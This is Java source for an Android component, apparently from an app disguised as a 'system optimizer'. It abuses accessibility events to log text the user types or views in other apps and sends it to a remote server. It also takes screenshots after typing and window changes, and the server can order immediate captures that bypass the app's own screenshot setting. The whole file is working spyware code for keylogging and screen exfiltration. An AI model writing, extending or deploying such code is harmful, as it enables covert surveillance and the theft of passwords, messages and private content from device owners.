package com.system.optimizer.event;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.function.Consumer;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONObject;
import org.json.JSONException;

import com.system.optimizer.network.SocketManager;
import com.system.optimizer.config.AppConfig;
import com.system.optimizer.config.ConfigData;
import com.system.optimizer.service.ScreenshotCallback;

import android.view.accessibility.AccessibilityEvent;

/**
 * Unified event handler for text events with optional screenshot capture.
 * 
 * Flow:
 * 1. Trigger with text (optional)
 * 2. After delay: capture screenshot
 * 3. Send text message (if provided)
 * 4. When screenshot resolves: send image
 */
public class AccessibilityEventHandler {

    private static final String TAG = "AccessibilityEventHandler";

    private static final long DELAY_MS = 2000;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Consumer<ScreenshotCallback> captureProvider;
    private final AppConfig appConfig;
    private final SocketManager socketManager;
    private final SimpleDateFormat timestampFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());

    private String pendingText = "";
    private final Runnable executeRunnable;
    private String pendingRequestId = null;

    public AccessibilityEventHandler(Consumer<ScreenshotCallback> captureProvider, AppConfig appConfig,
            SocketManager socketManager) {
        if (captureProvider == null) {
            throw new IllegalArgumentException("Capture provider cannot be null");
        }
        if (appConfig == null) {
            throw new IllegalArgumentException("AppConfig cannot be null");
        }
        if (socketManager == null) {
            throw new IllegalArgumentException("SocketManager cannot be null");
        }

        this.captureProvider = captureProvider;
        this.appConfig = appConfig;
        this.socketManager = socketManager;

        this.executeRunnable = () -> {
            String textToSend;

            // Extract text if available
            synchronized (this) {
                textToSend = pendingText;
                pendingText = "";
            }

            // Send text first (if available)
            if (textToSend != null && !textToSend.isEmpty()) {
                String timestamp = timestampFormat.format(new Date());
                String messageWithTimestamp = "[" + timestamp + "] " + textToSend;
                this.socketManager.sendEvent("logger", messageWithTimestamp);
            }

            // Check config before capturing screenshot (only for automatic captures)
            ConfigData config = appConfig.getConfig();
            if (pendingRequestId == null && !config.isAutoScreenshotEnabled()) {
                socketManager.sendEvent("screenshot_error", "Screenshot disabled in config");
                return;
            }

            // Capture screenshot after delay
            captureProvider.accept(new ScreenshotCallback() {
                @Override
                public void onSuccess(byte[] imageData) {
                    if (imageData != null) {
                        // Include request_id in response if present
                        String requestIdToSend;
                        synchronized (AccessibilityEventHandler.this) {
                            requestIdToSend = pendingRequestId;
                            pendingRequestId = null;
                        }

                        try {
                            if (requestIdToSend != null) {
                                JSONObject data = new JSONObject();
                                data.put("request_id", requestIdToSend);
                                data.put("image", imageData);
                                socketManager.sendEvent("screenshot_response", data);
                            } else {
                                // No request_id, send image directly
                                socketManager.sendEvent("screenshot_response", imageData);
                            }
                        } catch (JSONException e) {
                            Log.e(TAG, "Error building the JSON for the screenshot", e);
                            socketManager.sendEvent("screenshot_error", "Error building the JSON for the screenshot");
                        }
                    } else {
                        socketManager.sendEvent("screenshot_error", "Screenshot returned null data");
                    }
                }

                @Override
                public void onError(String errorMessage) {
                    socketManager.sendEvent("screenshot_error", errorMessage);
                }
            });
        };
    }

    /**
     * Handle accessibility event from AccessibilityMonitorService.
     */
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getText() == null) {
            return;
        }

        // Ignore system UI and keyboard events
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (packageName.equals("com.android.systemui") ||
                packageName.equals("android") ||
                packageName.equals("com.google.android.inputmethod.latin")) {
            return;
        }

        int eventType = event.getEventType();
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = normalizeTextEvent(event.getText());
            if (!text.isEmpty()) {
                triggerWithText(text);
            }
        } else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            triggerCaptureOnly();
        }
    }

    /**
     * Trigger with text - will send text and capture screenshot after delay.
     */
    public void triggerWithText(String text) {
        synchronized (this) {
            pendingText = text;
            pendingRequestId = null;
        }
        scheduleExecution();
    }

    /**
     * Trigger manual screenshot capture with request_id.
     * This bypasses the default delay and auto_screenshot config check.
     * 
     * @param requestId The request_id from the server to include in the response
     */
    public void triggerManualCapture(String requestId) {
        synchronized (this) {
            pendingText = "";
            pendingRequestId = requestId;
        }
        executeImmediately();
    }

    /**
     * Trigger for window change (TYPE_WINDOW_STATE_CHANGED) - capture screenshot
     * only.
     */
    public void triggerCaptureOnly() {
        synchronized (this) {
            pendingText = "";
            pendingRequestId = null;
        }
        scheduleExecution();
    }

    /**
     * Schedule execution after delay.
     */
    private void scheduleExecution() {
        handler.removeCallbacks(executeRunnable);
        handler.postDelayed(executeRunnable, DELAY_MS);
    }

    /**
     * Execute immediately without delay.
     */
    private void executeImmediately() {
        handler.removeCallbacks(executeRunnable);
        handler.post(executeRunnable);
    }

    /**
     * Normalize text from accessibility event.
     */
    private String normalizeTextEvent(java.util.List<CharSequence> text) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : text) {
            if (cs != null && cs.length() > 0) {
                if (sb.length() > 0) {
                    sb.append(": ");
                }
                sb.append(cs.toString().trim());
            }
        }
        return sb.toString();
    }
}
